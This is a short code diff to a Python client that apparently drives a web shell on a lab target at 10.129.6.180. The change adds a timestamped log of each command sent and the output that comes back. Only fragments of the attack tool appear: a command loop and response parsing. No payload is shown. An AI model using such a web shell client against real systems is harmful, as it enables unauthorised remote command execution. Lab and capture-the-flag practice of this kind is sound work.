@@ -9,6 +9,7 @@
 import requests
 import sys
 import os
+import datetime
 
 # Configuration
 TARGET_IP = "10.129.6.180"
@@ -55,6 +56,11 @@ def shell_repl():
             # <pre></pre> removal. hacky pos-based but works
             final_data = final_data[5:-6]
             print(final_data)
+
+            # log to file
+            with open('webshell_output.txt', 'a') as f:
+                f.write(f"{datetime.datetime.now()} - {cmd}\n")
+                f.write(final_data + '\n\n')
 
         except KeyboardInterrupt:
             print("\n[*] Interrupted by user. Exiting...")
